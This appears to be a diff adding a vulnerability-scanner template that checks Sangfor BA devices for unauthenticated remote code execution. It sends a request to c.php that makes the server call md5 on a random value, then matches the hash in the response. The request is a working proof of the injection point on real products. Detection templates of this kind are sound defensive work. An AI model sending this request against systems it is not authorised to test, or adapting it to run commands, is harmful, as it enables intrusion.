@@ -1,0 +1,29 @@
+id: "sangfor-ba-rce"
+name: "Sangfor BA - Remote Code Execution"
+severity: "critical"
+description: "Sangfor products allow remote unauthenticated users to cause the product to execute arbitrary commands."
+tech:
+  - "php"
+tags:
+  - "rce"
+  - "sangfor"
+  - "intrusive"
+  - "vuln"
+cwe: "CWE-78"
+reference: "https://mobile.twitter.com/sec715/status/1406886851072253953"
+spaExclusion: true
+request:
+  method: "GET"
+  path: "/tool/log/c.php?strip_slashes=md5&host={{rand}}"
+control:
+  method: "GET"
+  path: "/.guardian-none-{{rand}}"
+matchers-condition: "and"
+matchers:
+  - type: "word"
+    part: "body"
+    words:
+      - "{{md5(\"{{randstr}}\")}}"
+  - type: "status"
+    status:
+      - 200
